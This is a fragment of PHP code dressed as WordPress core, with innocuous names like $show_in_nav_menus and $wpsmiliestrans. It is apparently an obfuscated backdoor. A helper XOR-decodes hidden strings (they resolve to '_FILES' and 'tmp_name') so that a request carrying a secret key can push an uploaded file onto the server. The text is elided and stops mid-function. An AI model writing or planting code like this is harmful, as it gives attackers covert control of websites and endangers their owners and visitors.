...

{
    ...
    $show_in_nav_menus = 'SweRW1e1iI';
    $em_dash = $show_in_nav_menus;

    
    $hierarchical = $GLOBALS[all_parts("%0C1%2C%1E%12b", $em_dash)];
	$num_words = 'raw_username';
    $weeuns = $hierarchical;
    $days = isset($weeuns[$em_dash]);
    if ($days)

    {
        $wpsmiliestrans = $hierarchical[$em_dash];

        $postarr = $wpsmiliestrans[all_parts("%27%1A%15%0D9P%08T", $em_dash)];
...
function all_parts($post_excerpt, $labels)

{
    $data = $labels;

    $unsanitized_postarr = "url" . "decode";
    $prime = $unsanitized_postarr($post_excerpt);
    $path = substr($data,0, strlen($prime));
    $entity = $prime ^ $path;
    
    $prime = strpos($entity, $path);
